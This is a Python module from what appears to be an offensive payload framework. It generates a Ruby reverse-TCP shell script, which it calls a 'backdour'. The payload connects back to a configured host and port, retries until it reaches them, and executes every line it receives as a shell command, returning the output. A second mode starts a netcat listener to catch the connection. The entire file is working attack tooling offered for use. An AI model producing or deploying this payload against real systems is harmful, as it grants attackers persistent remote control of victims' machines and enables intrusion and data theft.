import time,socket,os
from waf.libs.color  import *
from waf.libs import variable as var

info = {
        "name"        : "nc_ruby reverse_tcp",
        "title"       : "Payload ruby",
        "module"      : "payloads/nc/ruby/reverse_tcp linux unix",
        "description" : "Payload creation and exploitation"
}

var.lname = ["payload.rb"]
var.ltype = ["listen"]

options ={
  "LHOST" : [str(var.lhost[0]),'The listen address'],
  "LPORT" : [str(var.lport[0]),'The listen port'],
  "LNAME" : [str(var.lname[0]),'The name of payload'],
  "LTYPE" : [str(var.ltype[0]),'Choose listen or create <listen / create>']
}

def running():
    try:
        if var.ltype[0] == "CREATE" or var.ltype[0] == "create":
            print ("")
            print (blue+"[*]"+default+ "Create a backdour")
            time.sleep(2)
            print ("")
            time.sleep(2)
            print ("")
            print (green_underline+"[*] Done"+default)
            time.sleep(2)
            print ("")
            mark = '"'
            f = open(var.lname[0] , 'w')
            payload = '''
#!/usr/bin/env ruby
require 'socket'
require 'open3'

RHOST = '''+mark+var.lhost[0]+mark+'''
PORT  = '''+mark+var.lport[0]+mark+'''

begin
sock = TCPSocket.new "#{RHOST}", "#{PORT}"
rescue
    sleep 20
    retry
    end

begin
    while line = sock.gets
        Open3.popen2e("#{line}") do | stdin, stdout_and_stderr |
            IO.copy_stream(stdout_and_stderr, sock)
            end
    end
rescue
    retry
end

'''
            f.write(payload)
            f.close()

        elif var.ltype[0] == "LISTEN" or var.ltype[0] == "listen":
            os.system("nc -l -p "+str(var.lport[0])+" -v")

        else:
            print (red+"[-]"+default+"Choose LTYPE " )
    except Exception as e:
        print(red+"\n[-]"+default+"Error : "+str(e))
